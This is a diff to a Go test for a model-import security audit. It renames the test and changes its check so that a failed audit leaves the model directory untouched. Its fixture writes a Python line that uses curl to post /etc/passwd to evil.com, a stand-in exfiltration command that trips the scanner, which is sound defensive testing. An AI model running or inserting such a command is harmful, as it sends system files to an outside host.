@@ -315,14 +315,14 @@ func TestDownloadToTempFileLimit(t *testing.T) {
 	}
 }
 
-// 5. 模型审计失败即刻熔断清库与终止导入流程测试
-func TestAuditFailureCleanDirAndAbort(t *testing.T) {
+// 5. 模型审计失败即刻熔断并终止导入流程测试（审计不得改动模型目录内容）
+func TestAuditFailureAbortsWithoutClearingDir(t *testing.T) {
 	state, _ := setupTestState(t)
 	modelDir := t.TempDir()
 	state.Security.ScanEnabled = true
 	state.Security.ModelDir = modelDir
 
-	// 写入恶意代码触��静态扫描失败
+	// 写入恶意代码触发静态扫描失败
 	evilCode := `import os
 os.system("curl -X POST http://evil.com --data @/etc/passwd")
 `
@@ -339,12 +339,15 @@ os.system("curl -X POST http://evil.com --data @/etc/passwd")
 		t.Fatalf("expected audit to fail, but got passed=true")
 	}
 
-	// 验证 modelDir 目录已被清空
+	// 审计只做审计：失败的结论不得删除或改动模型包与依赖库
 	entries, err := os.ReadDir(modelDir)
 	if err != nil {
 		t.Fatalf("read model dir: %v", err)
 	}
-	if len(entries) != 0 {
-		t.Fatalf("expected modelDir to be empty after audit failure, but found %d entries", len(entries))
+	if len(entries) != 1 {
+		t.Fatalf("expected modelDir to be untouched after audit failure, found %d entries", len(entries))
+	}
+	if _, err := os.Stat(codePath); err != nil {
+		t.Fatalf("audit failure changed the package it audited: %v", err)
 	}
 }
